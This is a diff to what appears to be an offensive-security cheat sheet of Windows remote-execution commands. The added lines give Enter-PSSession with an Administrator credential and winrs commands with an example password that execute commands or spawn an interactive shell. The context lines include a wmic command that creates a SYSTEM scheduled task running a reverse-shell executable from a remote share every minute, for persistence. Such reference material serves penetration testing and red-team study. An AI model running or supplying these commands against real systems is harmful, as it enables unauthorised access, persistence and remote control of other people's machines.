@@ -36,6 +36,10 @@
 
     Enter-PSSession -Computer Srv01.Security.local
 
+##### Connect to PSSession with a trusted remote account
+
+    Enter-PSSession -ComputerName IP/FQDN -Credential Administrator
+
 ##### Store session as variable
 
     $Session = New-PSSession -Computer Srv01.Security.local
@@ -108,4 +112,14 @@
 ##### Setting up persistence with schtasks on a remote system to execute a reverse shell every minute/
 
     wmic /node:10.10.10.5 /user:moe process call create "schtasks /create /sc minute /mo 1 /tn "Persistence" /tr \\10.10.10.200\Share\reverse.exe /ru "SYSTEM""
+
+# Winrs
+
+##### Connect remotely to system and execute a command
+
+    winrs -r:IP/FQDN -u:workstation\administrator -p:Password@987 COMMAND
+
+##### Get an interactive shell
+
+    winrs -r:IP/FQDN -u:workstation\administrator -p:Password@987 CMD
 
